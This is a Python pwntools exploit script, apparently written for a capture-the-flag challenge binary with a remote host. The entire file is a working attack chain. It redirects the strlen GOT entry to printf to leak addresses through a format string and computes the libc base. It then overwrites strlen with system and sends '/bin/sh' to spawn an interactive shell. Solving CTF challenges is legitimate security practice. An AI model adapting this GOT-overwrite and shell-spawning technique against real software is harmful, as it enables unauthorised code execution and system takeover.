#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall.elf'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'tcp.sasc.tf', 10443

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# create nft
# break *0x401a7a

# edit compliment
break *0x401aef

# fgets
break *0x401455

# strlen 
break *0x004014fe
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chall.elf 
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

def exploit():
    global io
    io = initialize()

    io.sendlineafter(b':', b'c')
    io.sendlineafter(b':', b'')
    io.sendlineafter(b':', b'n')
    io.sendlineafter(b':', str(elf.got['strlen']).encode())
    io.sendlineafter(b':', b'c')
    io.sendlineafter(b':', p64(elf.plt['printf']))
    io.sendlineafter(b':', b'p')

    io.sendlineafter(b':', b'c')
    io.sendlineafter(b':', b'%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p\x00')
    io.sendlineafter(b':', b'p')

    libc.address = int(io.recvuntil(b'|', drop=True).strip(), 16) - 0x212643

    io.sendlineafter(b':', b'c')
    io.sendlineafter(b':', b'')
    io.sendlineafter(b':', b'n')
    io.sendlineafter(b':', str(elf.got['strlen']).encode())
    io.sendlineafter(b':', b'c')
    io.sendlineafter(b':', p64(libc.sym['system']))
    io.sendlineafter(b':', b'p')

    io.sendlineafter(b':', b'c')
    io.sendlineafter(b':', b'/bin/sh\x00')
    io.sendlineafter(b':', b'p')

    log.info('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
